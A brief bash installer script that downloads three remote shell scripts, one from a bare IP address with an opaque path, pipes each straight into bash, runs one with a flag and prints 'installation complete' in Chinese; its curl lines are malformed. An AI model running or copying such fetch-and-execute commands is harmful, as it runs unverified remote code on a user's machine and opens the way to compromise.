#!/bin/bash

bash -c "$(curl -sS wget https://raw.fastgit.org/50801684/-/master/4.sh)"
bash -c "$(curl -sS wget https://raw.fastgit.org/50801684/-/master/5.sh)"
bash -c "$(curl -sS wget http://159.75.133.49:8888/down/aOncyDmBGyKL)"

./4.sh -d 
echo "安装完成"
